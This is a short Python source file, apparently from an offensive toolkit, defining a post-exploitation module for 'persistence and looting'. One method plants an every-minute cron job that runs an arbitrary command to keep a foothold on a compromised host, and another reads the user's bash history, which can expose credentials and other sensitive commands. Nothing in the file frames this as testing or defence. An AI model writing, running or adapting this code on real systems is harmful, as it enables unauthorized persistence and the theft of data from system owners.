from ..system import SystemControl

class PostExploitModule:
    """
    Handles Persistence and Looting.
    """
    def __init__(self, system_control):
        self.system = system_control

    def add_persistence_cron(self, cmd):
        """
        Adds a cron job for persistence.
        (crontab -l 2>/dev/null; echo "* * * * * cmd") | crontab -
        """
        cron_cmd = f'(crontab -l 2>/dev/null; echo "* * * * * {cmd}") | crontab -'
        return self.system.execute(cron_cmd)

    def extract_history(self):
        """
        Reads bash history.
        """
        return self.system.execute("cat ~/.bash_history")
